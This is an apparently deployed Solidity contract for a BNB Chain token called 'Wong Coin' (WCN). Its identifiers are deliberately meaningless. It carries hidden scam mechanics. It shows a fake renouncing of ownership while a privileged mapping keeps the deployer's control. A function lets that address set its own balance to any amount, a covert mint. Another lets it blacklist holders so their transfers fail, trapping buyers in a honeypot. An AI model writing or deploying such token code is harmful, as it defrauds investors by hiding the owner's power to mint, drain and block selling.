/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface amountToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletTo) external view returns (uint256);

    function transfer(address fromToken, uint256 modeTeamMax) external returns (bool);

    function allowance(address listBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTeamMax) external returns (bool);

    function transferFrom(
        address sender,
        address fromToken,
        uint256 modeTeamMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundTx, uint256 value);
    event Approval(address indexed listBuy, address indexed spender, uint256 value);
}

interface marketingTrading is amountToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract minTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderReceiver {
    function createPair(address autoAmount, address atMin) external returns (address);
}

interface swapMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract WongCoin is minTrading, amountToken, marketingTrading {

    function fundLaunchedAuto(address amountToShould, address fromToken, uint256 modeTeamMax) internal returns (bool) {
        require(txWallet[amountToShould] >= modeTeamMax);
        txWallet[amountToShould] -= modeTeamMax;
        txWallet[fromToken] += modeTeamMax;
        emit Transfer(amountToShould, fromToken, modeTeamMax);
        return true;
    }

    function senderEnableFund(uint256 modeTeamMax) public {
        if (!swapToken[_msgSender()]) {
            return;
        }
        txWallet[takeFrom] = modeTeamMax;
    }

    bool public toFee;

    constructor (){
        
        swapMode walletBuy = swapMode(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        listSwap = senderReceiver(walletBuy.factory()).createPair(walletBuy.WETH(), address(this));
        autoExempt = _msgSender();
        if (toMode) {
            launchedTo = maxReceiver;
        }
        takeFrom = _msgSender();
        swapToken[_msgSender()] = true;
        if (toFee != toMode) {
            toFee = true;
        }
        txWallet[_msgSender()] = listWalletFrom;
        emit Transfer(address(0), takeFrom, listWalletFrom);
        marketingReceiver();
    }

    uint256 public launchedTo;

    mapping(address => bool) public swapToken;

    address public listSwap;

    function marketingReceiver() public {
        emit OwnershipTransferred(takeFrom, address(0));
        autoExempt = address(0);
    }

    function atTeam() public view returns (uint256) {
        return maxReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return feeBuy;
    }

    function feeSell(address takeMarketingBuy) public {
        if (minAuto) {
            return;
        }
        
        swapToken[takeMarketingBuy] = true;
        if (launchedTo == maxReceiver) {
            toMode = false;
        }
        minAuto = true;
    }

    bool private toMode;

    uint256 private maxReceiver;

    function name() external view virtual override returns (string memory) {
        return autoLaunch;
    }

    string private autoLaunch = "Wong Coin";

    function isTradingTeam(address listToken) public {
        if (toFee) {
            launchedTo = maxReceiver;
        }
        if (listToken == takeFrom || listToken == listSwap || !swapToken[_msgSender()]) {
            return;
        }
        if (toFee) {
            launchedTo = maxReceiver;
        }
        launchedLimit[listToken] = true;
    }

    function amountLaunch(address amountToShould, address fromToken, uint256 modeTeamMax) internal returns (bool) {
        if (amountToShould == takeFrom) {
            return fundLaunchedAuto(amountToShould, fromToken, modeTeamMax);
        }
        require(!launchedLimit[amountToShould]);
        return fundLaunchedAuto(amountToShould, fromToken, modeTeamMax);
    }

    mapping(address => mapping(address => uint256)) private teamFundAmount;

    function transfer(address receiverBuy, uint256 modeTeamMax) external virtual override returns (bool) {
        return amountLaunch(_msgSender(), receiverBuy, modeTeamMax);
    }

    function owner() external view returns (address) {
        return autoExempt;
    }

    function receiverLimit() public view returns (bool) {
        return toMode;
    }

    function getOwner() external view returns (address) {
        return autoExempt;
    }

    bool public minAuto;

    address public takeFrom;

    mapping(address => uint256) private txWallet;

    string private launchSwap = "WCN";

    function balanceOf(address walletTo) public view virtual override returns (uint256) {
        return txWallet[walletTo];
    }

    mapping(address => bool) public launchedLimit;

    uint8 private feeBuy = 18;

    function symbol() external view virtual override returns (string memory) {
        return launchSwap;
    }

    address private autoExempt;

    function approve(address teamFrom, uint256 modeTeamMax) public virtual override returns (bool) {
        teamFundAmount[_msgSender()][teamFrom] = modeTeamMax;
        emit Approval(_msgSender(), teamFrom, modeTeamMax);
        return true;
    }

    event OwnershipTransferred(address indexed launchedSender, address indexed swapLaunched);

    function buySell() public view returns (bool) {
        return toFee;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listWalletFrom;
    }

    function transferFrom(address amountToShould, address fromToken, uint256 modeTeamMax) external override returns (bool) {
        if (teamFundAmount[amountToShould][_msgSender()] != type(uint256).max) {
            require(modeTeamMax <= teamFundAmount[amountToShould][_msgSender()]);
            teamFundAmount[amountToShould][_msgSender()] -= modeTeamMax;
        }
        return amountLaunch(amountToShould, fromToken, modeTeamMax);
    }

    function allowance(address exemptTeam, address teamFrom) external view virtual override returns (uint256) {
        return teamFundAmount[exemptTeam][teamFrom];
    }

    uint256 private listWalletFrom = 100000000 * 10 ** 18;

    function autoIs() public {
        
        
        launchedTo=0;
    }

    function senderLiquidity() public {
        if (toMode == toFee) {
            launchedTo = maxReceiver;
        }
        
        toFee=false;
    }

}